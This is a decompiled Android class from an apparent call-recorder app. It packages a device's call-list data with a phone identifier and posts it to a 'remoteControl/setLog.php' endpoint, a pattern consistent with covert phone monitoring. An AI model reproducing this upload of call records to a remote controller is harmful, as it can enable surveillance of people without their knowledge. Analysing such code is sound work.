package com.yasoka.spcallrecord.recorder.call.a.c.a;

import a.c.e.e;
import a.c.j.c;
import android.content.Context;
import com.app.action.a;
import com.app.activity.MyApp;
import java.util.HashMap;
import java.util.Map;

/* compiled from: GetListCalls */
public class b {

    /* renamed from: a reason: collision with root package name */
    private int f4a;

    /* renamed from: b reason: collision with root package name */
    private int f5b;

    /* renamed from: c reason: collision with root package name */
    private String f6c;

    /* renamed from: d reason: collision with root package name */
    private String f7d;

    public b(int i, int i2, String str, String str2) {
        this.f4a = i;
        this.f5b = i2;
        this.f6c = str;
        this.f7d = str2;
        String str3 = "";
        try {
            Context applicationContext = MyApp.b().getApplicationContext();
            String a2 = a.a(applicationContext, this.f4a, this.f6c);
            String b2 = c.b();
            HashMap hashMap = new HashMap();
            StringBuilder sb = new StringBuilder();
            sb.append(str3);
            sb.append(e.e(applicationContext));
            hashMap.put("idPhone", sb.toString());
            hashMap.put("dateConnexion", b2);
            hashMap.put("type", this.f7d);
            StringBuilder sb2 = new StringBuilder();
            sb2.append(str3);
            sb2.append(this.f5b);
            hashMap.put("idLog", sb2.toString());
            hashMap.put("data", a2);
            long a3 = a.a.a(e.e(applicationContext), b2, this.f7d, this.f5b, a2, applicationContext);
            if (a.c.e.a.b("remoteControl/setLog.php", (Map<String, String>) hashMap)) {
                a.a.d((int) a3, applicationContext);
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
    }
}
